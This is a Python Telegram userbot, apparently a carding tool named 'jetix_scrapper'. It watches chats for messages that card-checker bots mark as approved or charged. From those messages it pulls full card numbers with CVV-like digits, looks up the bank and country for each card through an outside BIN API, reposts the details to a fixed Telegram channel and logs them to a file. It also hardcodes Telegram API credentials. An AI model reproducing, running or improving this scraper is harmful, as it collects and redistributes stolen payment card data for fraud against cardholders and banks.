import pyrogram
import re
import asyncio
import aiohttp

app = pyrogram.Client(
    'jetix_scrapper',
    api_id='6134343',
    api_hash='344493a60221b6483e47b00ff1461708'
)

BIN_API_URL = 'https://jetixchecker.com/v1/bin/{}'

def filter_cards(text):
    regex = r'\d{16}.*\d{3}'
    matches = re.findall(regex, text)
    return matches

async def get_bin_info(piash_vai):
    bin_info_url = BIN_API_URL.format(piash_vai)
    async with aiohttp.ClientSession() as session:
        async with session.get(bin_info_url) as response:
            if response.status == 200:
                return await response.json()
            else:
                return None

async def approved(Client, message):
    try:
        if re.search(r'(Approved!|Charged|authenticate_successful|𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱|APPROVED|New Cards Found By JennaScrapper|ꕥ Extrap [☭]|み RIMURU SCRAPE by|Approved) ✅', message.text):
            filtered_card_info = filter_cards(message.text)
            if not filtered_card_info:
                return

            for card_info in filtered_card_info:
                piash_vai = card_info[:6]
                bin_info = await get_bin_info(piash_vai)
                if bin_info:
                    data = bin_info.get('data', {})
                    formatted_message = (
                        f"⚜️Card ➔ <code>{card_info}</code>\n"
                        f"⚜️Status ➔ <b>Approved! ✅</b>\n"
                        "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</b>\n"
                        f"⚜️Bin ➔ <b>{data.get('brand', '')}, {data.get('type', '')}, {data.get('category', '')}</b>\n"
                        f"⚜️Bank ➔ <b>{data.get('bank', '')}</b>\n"
                        f"⚜️Country ➔ <b>{data.get('country_name', '')}, {data.get('country_flag', '')}</b>\n"
                        "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -</b>\n"
                        "⚜️Creator ➔ <b>𝙅𝙚𝙩𝙞𝙭</b>"
                    )

                    await Client.send_message(chat_id='-1001822979359', text=formatted_message)

                    with open('reserved.txt', 'a', encoding='utf-8') as f:
                        f.write(card_info + '\n')
                else:
                    pass 
    except Exception as e:
        print(e)

@app.on_message()
async def astro(Client, message):
    if message.text:
        await asyncio.create_task(approved(Client, message))

app.run()
